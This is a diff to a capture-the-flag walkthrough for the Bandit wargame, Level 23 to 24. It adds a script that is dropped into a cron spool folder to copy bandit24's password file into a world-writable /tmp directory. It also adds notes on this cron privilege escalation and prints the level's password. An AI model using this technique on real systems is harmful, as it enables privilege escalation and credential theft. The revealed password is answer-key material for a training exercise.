@@ -491,7 +491,7 @@ cat /tmp/<hash>                           # read the password
 ---
 ## Level 23 → 24
 
-**Goal:** **Goal:** Write a script that bandit24's cron job will execute (it runs all scripts in `/var/spool/bandit24/foo` owned by bandit23), using it to exfiltrate bandit24's password.
+**Goal:** Write a script that bandit24's cron job will execute (it runs all scripts in `/var/spool/bandit24/foo` owned by bandit23), using it to exfiltrate bandit24's password.
 
 **Commands:**
 ```bash
@@ -525,13 +525,41 @@ do
         rm -rf "./$i"
     fi
 done
+
+# Create working directory with open permissions
+bandit23@bandit:~$ mkdir -p /tmp/mydir245
+bandit23@bandit:~$ chmod 777 /tmp/mydir245
+bandit23@bandit:~$ cd /tmp/mydir245
+
+# Write the exploit script line by line
+bandit23@bandit:/tmp/mydir245$ nano exploit.sh
+--input
+#!/bin/bash
+mkdir -p /tmp/mydir245
+chmod 777 /tmp/mydir245
+cat /etc/bandit_pass/bandit24 > /tmp/mydir245/password.txt
+chmod 644 /tmp/mydir245/password.txt
+
+
+# Make executable and deploy to cron drop folder
+bandit23@bandit:~$ chmod +x /tmp/mydir245/exploit.sh
+bandit23@bandit:~$ cp /tmp/mydir245/exploit.sh /var/spool/bandit24/foo/exploit.sh
+
+# Wait 60 seconds for cron to fire, then read the password
+bandit23@bandit:~$ cat /tmp/mydir245/password.txt
+--output
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
 
-**Key concept:** 
+**Key concept:** Cron job exploitation — bandit24's cron runs every minute and executes any script in `/var/spool/bandit24/foo` owned by `bandit23`. Since the script runs as `bandit24`, it can read `/etc/bandit_pass/bandit24` which is inaccessible to us directly. We abuse this to escalate privileges and exfiltrate the password.
 
 **Notes:** 
+- The output directory must be `chmod 777` before the cron fires — the script runs as `bandit24`, so it needs write access to our `/tmp` folder
+- `-p` flag in `mkdir -p` means "parents" — creates parent directories if they don't exist and suppresses errors if the directory is already there, so the script won't crash on a second run
+- You cannot `ls /var/spool/bandit24/foo` as bandit23 — permission denied is normal. Trust that `cp` worked if it returned no error
+- The cron job deletes scripts after running them — if your script disappears from the folder, it ran.
 
-**Password:**
+**Password:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 
 ---
 ## Level X → X
